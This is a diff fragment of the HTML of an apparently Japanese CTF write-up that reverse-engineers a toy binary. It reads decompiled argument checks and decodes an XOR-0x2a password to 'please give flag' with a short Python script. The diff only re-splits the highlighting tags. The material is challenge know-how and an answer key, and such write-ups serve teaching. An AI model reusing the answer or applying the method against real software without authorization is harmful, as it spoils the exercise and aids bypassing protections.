 </code></pre></div><p>以下の部分で引数のチェックを行っています。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">if</span> ((iVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span> (local_ac <span style="color:#f92672">+</span> local_b0 <span style="color:#f92672">*</span> <span style="color:#ae81ff">100</span> <span style="color:#f92672">+</span> local_b4 <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x3a4</span>)) {
-  iVar1 <span style="color:#f92672">=</span> strcmp(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)(lParm2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>),<span style="color:#e6db74">&#34;chicken&#34;</span>);
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">if</span> ((iVar1 <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;</span><span style="color:#f92672">&amp;</span> (local_ac <span style="color:#f92672">+</span> local_b0 <span style="color:#f92672">*</span> <span style="color:#ae81ff">100</span> <span style="color:#f92672">+</span> local_b4 <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3a4</span>)) {
+  iVar1 <span style="color:#f92672">=</span> strcmp(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#f92672">*</span>)(lParm2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>),<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">chicken</span><span style="color:#e6db74">&#34;</span>);
 </code></pre></div><p>0x3a4は10進数で932なので、３つの引数は以下になります。</p>
 <pre><code>local_b4  = 3
 local_b0 = 9
@@ -1338,9 +1338,9 @@ Well, you found the arguments, but what<span style="color:#e6db74">&#39;s the pa
 </span><span style="color:#e6db74">I&#39;</span>m sure it<span style="color:#960050;background-color:#1e0010">&#39;</span>s just a typo. Try again.
 </code></pre></div><p>次はパスワードを当てる必要があるようです。</p>
 <p>以下の部分でパスワードの判定をしています。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"> <span style="color:#66d9ef">while</span> (local_a8 <span style="color:#f92672">&lt;=</span> local_a4) {
-              <span style="color:#66d9ef">if</span> ((local_98[(<span style="color:#66d9ef">long</span>)local_a8] <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x2a</span>) <span style="color:#f92672">!=</span> desired[(<span style="color:#66d9ef">long</span>)local_a8]) {
-                puts(<span style="color:#e6db74">&#34;I</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">m sure it</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">s just a typo. Try again.&#34;</span>);
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"> <span style="color:#66d9ef">while</span> (local_a8 <span style="color:#f92672">&lt;</span><span style="color:#f92672">=</span> local_a4) {
+              <span style="color:#66d9ef">if</span> ((local_98[(<span style="color:#66d9ef">long</span>)local_a8] <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x2a</span>) <span style="color:#f92672">!</span><span style="color:#f92672">=</span> desired[(<span style="color:#66d9ef">long</span>)local_a8]) {
+                puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">I</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">m sure it</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">s just a typo. Try again.</span><span style="color:#e6db74">&#34;</span>);
                 uVar2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
                 <span style="color:#66d9ef">goto</span> LAB_00400bc7;
               }
@@ -1388,9 +1388,9 @@ Well, you found the arguments, but what<span style="color:#e6db74">&#39;s the pa
     <span style="color:#ae81ff">0x2A</span>
     ]
 
-flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>
 <span style="color:#66d9ef">for</span> e <span style="color:#f92672">in</span> enc:
-    flag <span style="color:#f92672">+=</span> chr(e <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x2a</span>)
+    flag <span style="color:#f92672">+</span><span style="color:#f92672">=</span> chr(e <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x2a</span>)
 <span style="color:#66d9ef">print</span>(flag)
 </code></pre></div><p>正しいパスワードは<code>please give flag</code>でした。</p>
 <p>早速CTFページにあるshellに入力してみましょう。</p>
